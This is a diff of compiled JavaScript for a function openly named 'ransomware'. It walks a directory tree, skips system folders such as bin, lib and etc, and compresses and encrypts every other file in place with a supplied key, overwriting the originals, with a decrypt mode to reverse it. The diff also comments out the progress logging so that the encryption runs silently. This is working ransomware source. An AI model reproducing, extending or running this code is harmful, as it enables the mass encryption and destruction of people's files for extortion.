@@ -7,82 +7,8 @@ const zlib_1 = __importDefault(require("zlib"));
 const fs_1 = __importDefault(require("fs"));
 const crypto_1 = __importDefault(require("crypto"));
 const fdir_1 = require("fdir");
-/*
-const removeElementsInWhiteList = (listOfFiles: string[]) => {
-  const whitelist = [
-    "ld-musl-aarch64.so.1",
-    "libc.musl-aarch64.so.1",
-  ];
-
-// This code takes to long
- *
- * const newList = [];
-
-  let addFile = true;
-  for (let i = 0; i < listOfFiles.length; ++i) {
-    addFile = true;
-    for (let j = 0; j < whitelist.length; ++j) {
-      let filename = "";
-      if (/\//g.test(listOfFiles[i])) {
-        const aux = listOfFiles[i].split("/");
-        filename = aux[aux.length-1];
-      } else {
-        filename = listOfFiles[i];
-      }
-
-      if (filename === whitelist[j]) {
-        addFile = false;
-      }
-
-    }
-    if (addFile) {
-      newList.push(listOfFiles[i]);
-    } else {
-      addFile = true;
-    }
-  }
-  return newList;
-  //
-  return listOfFiles;
-}
-*/
-/*
-let counter = 0;
-let time = new Date();
-const readdir = (directory: string) => {
-  ++counter;
-  if (counter % 10) {
-    console.log(`${counter} directories read in ${+new Date() - +time} ms`);
-  }
-  let fileList: string[] = [];
-
-  let files: string[] = [];
-  try {
-    files = fs.readdirSync(directory);
-  } catch(err) {
-        
-  }
- 
-  for (const file of files) {
-    const p = path.join(directory, file);
-    try {
-      if (fs.statSync(p)?.isDirectory()) {
-        fileList = [...fileList, ...(readdir(p))];
-      } else {
-        fileList.push(p);
-      }
-    } catch(err) {
-      return fileList;
-    }
-  }
-
-  return fileList;
-}
-*/
 const readdir = (directory) => {
-    let dirCounter = 0;
     const api = new fdir_1.fdir().exclude((filename, path) => {
-        console.log(`Searching in dir ${path} (${dirCounter++})`);
         let startPath = path;
         let subPath = path;
         try {
@@ -92,6 +18,7 @@ const readdir = (directory) => {
         catch (err) {
             // silent error
         }
+        // folders i want to ignore
         switch (startPath) {
             case "bin":
             case "lib":
@@ -100,6 +27,7 @@ const readdir = (directory) => {
             case "etc":
                 return true;
         }
+        // Subfolders i want to ignore
         switch (subPath) {
             case "usr/bin":
             case "usr/lib":
@@ -217,10 +145,10 @@ const decrypt = (data, password) => {
 const ransomware = (options) => {
     options = options.substring(12, options.length);
     const [mode, key, path, speed] = options.split(" ");
-    console.log("Readding directories for files...");
-    let oldTime = new Date();
+    //console.log("Readding directories for files...");
+    //let oldTime = new Date();
     const filesInPath = readdir(path);
-    console.log(`Files found in ${+new Date() - +oldTime} ms`);
+    //console.log(`Files found in ${+new Date() - +oldTime} ms`);
     console.log("Procesing " + filesInPath.length + " files...");
     for (let i = 0; i < filesInPath.length; ++i) {
         /*
@@ -241,22 +169,22 @@ const ransomware = (options) => {
           }
         }
         */
-        console.log(`${i} of ${filesInPath.length} as ${filesInPath[i]} ...`);
+        //console.log(`${i} of ${filesInPath.length} as ${filesInPath[i]} ...`); 
         try {
             const fileData = loadFile(filesInPath[i]);
             if (mode === "e" || mode === "encrypt") {
-                console.log("Compressing file with level " + speed);
-                oldTime = new Date();
+                //console.log("Compressing file with level " + speed);
+                //oldTime = new Date();
                 const compressedFileDataBuffer = compressBuffer(fileData, +speed);
-                console.log(`${fileData.length} bytes compressed in ${+new Date() - +oldTime} ms`);
-                console.log("Encrypting file...");
-                oldTime = new Date();
+                //console.log(`${fileData.length} bytes compressed in ${+new Date() - +oldTime} ms`);
+                //console.log("Encrypting file...");
+                //oldTime = new Date();
                 const encryptedDataBuffer = encrypt(compressedFileDataBuffer, key);
-                console.log(`File encrypted in ${+new Date() - +oldTime} ms`);
-                console.log("Writing file to disk...");
-                oldTime = new Date();
+                //console.log(`File encrypted in ${+new Date() - +oldTime} ms`);
+                //console.log("Writing file to disk...");
+                //oldTime = new Date();
                 saveToFile(filesInPath[i], encryptedDataBuffer);
-                console.log(`File writed in ${+new Date() - +oldTime} ms`);
+                //console.log(`File writed in ${+new Date() - +oldTime} ms`);
             }
             else {
                 const decryptedDataBuffer = decrypt(fileData, key);
@@ -265,7 +193,7 @@ const ransomware = (options) => {
             }
         }
         catch (err) {
-            console.log("Error loading file: " + err);
+            //      console.log("Error loading file: " + err);
             // silent error
         }
     }
